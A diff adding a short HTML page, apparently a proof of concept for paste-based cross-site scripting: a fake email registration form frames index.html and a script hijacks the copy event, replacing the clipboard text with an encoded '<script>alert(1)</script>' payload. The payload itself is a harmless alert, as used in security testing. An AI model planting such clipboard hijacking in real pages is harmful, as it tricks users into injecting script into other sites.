@@ -1,0 +1,22 @@
+<html>
+    <head>
+    </head>
+    <body>
+        Enter your email below to register:
+        </br>
+        <textarea autofocus style="width:220px; height:35px;"></textarea>
+        </br>
+        Repeat your email:
+        </br>
+        <iframe style="width:230px; height:50px;" frameBorder="0" src="index.html"></iframe>
+        </br>
+        <input type="submit"></input>
+        <script>
+            document.addEventListener('copy', function(e){
+                console.log(e);
+                e.clipboardData.setData('text/plain', '\x3cscript\x3ealert(1)\x3c/script\x3e');
+                e.preventDefault(); // We want our data, not data from any selection, to be written to the clipboard
+            });
+        </script>
+    </body>
+</html>
